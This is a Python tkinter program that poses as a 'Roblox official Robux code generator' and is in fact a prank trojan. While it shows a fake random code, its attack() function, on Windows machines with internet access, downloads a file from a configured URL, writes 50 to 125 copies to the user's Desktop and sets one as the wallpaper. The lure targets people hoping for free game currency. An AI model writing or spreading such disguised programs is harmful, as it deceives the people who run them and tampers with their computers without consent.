import os
from os import path
from tkinter import *
from PIL import Image, ImageTk
import platform
import random
import backend.config as c
import backend.paths as paths

# ! WORKS ONLY IN THE WINDOWS

window = Tk()
window.title("ROBLOX OFFICIAL ROBUX CODE GENERATOR 🤑🤑🤑🤑")
window.geometry("400x400")

robuxtext = Label(window, text="Click on the button below to win a 1 Billion robux Code 🤑")
robuxtext.pack(padx=15,pady=25)

getrobuxnow = Button(window, text="GENERATE NEW CODE NOW!!!")
getrobuxnow.pack(pady=15)

code = Label(window, text="Output: Nothing 😭")
code.pack(padx=15,pady=10)

bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
robux = Label(image=bobuximg)
robux.pack()

try:
    import requests

    checkintenet = requests.get("https://www.google.com")
    response = requests.get(c.url, stream=True)
    hasinternet = True
except Exception as e:
    hasinternet = False

def generateFakeCode():
    fakecode = ""
    
    import yaml
    chars = yaml.safe_load(open(paths.yaml("chars")))["chars"]
    for i in range(random.randint(10, 20)):
        fakecode += random.choice(chars)  
    code.config(text="Output: "+fakecode)

def attack():
    generateFakeCode()

    for i in range(random.randint(50, 125)):
        with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
            f.write(response.content)

    import ctypes
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(0)), 0)   

if platform.system().lower() != "windows" or not hasinternet:
    getrobuxnow.config(command=generateFakeCode)
    print('Operating System not supported or is without internet!')
else:
    getrobuxnow.config(command=attack)

window.mainloop()